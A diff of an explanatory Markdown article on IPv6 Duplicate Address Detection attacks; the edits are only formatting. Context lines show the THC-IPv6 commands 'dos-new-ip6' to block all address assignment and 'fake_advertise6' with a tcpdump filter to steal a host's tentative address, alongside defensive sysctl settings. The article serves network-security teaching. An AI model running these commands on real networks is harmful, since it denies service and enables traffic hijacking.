@@ -12,7 +12,7 @@ IPv6 Duplicate Address Detection (DAD) is a mechanism where a host checks whethe
 
 ## How DAD Works
 
-```
+```text
 Host (configuring 2001:db8::10)
   |
   |-- NS: "Is 2001:db8::10 in use?" --> ff02::1:ff00:10 (solicited-node multicast)
@@ -31,6 +31,7 @@ By responding to every DAD probe with a fake NA, an attacker can prevent any hos
 
 ```bash
 # Respond to all DAD probes (prevents any host from getting an IPv6 address)
+
 sudo dos-new-ip6 eth0
 
 # Target specific prefix
@@ -67,7 +68,7 @@ An attacker can "steal" a host's IPv6 address during DAD:
 # Monitor for DAD probes
 sudo tcpdump -i eth0 -n 'icmp6 and ip6[40] == 135'
 
-# When you see a NS with unspecified source (::) — it's a DAD probe
+# When you see a NS with unspecified source (::) - it's a DAD probe
 # Quickly send NA claiming ownership of that address
 sudo fake_advertise6 eth0 <detected_tentative_address>
 ```
@@ -126,4 +127,4 @@ sudo sysctl -w net.ipv6.conf.eth0.dad_transmits=1
 sudo journalctl -f -u NetworkManager | grep -i duplicate
 ```
 
-Understanding DAD attacks is important for IPv6 network security — particularly in environments without SEND, where any host on the segment can interfere with IPv6 address assignment.
+Understanding DAD attacks is important for IPv6 network security - particularly in environments without SEND, where any host on the segment can interfere with IPv6 address assignment.
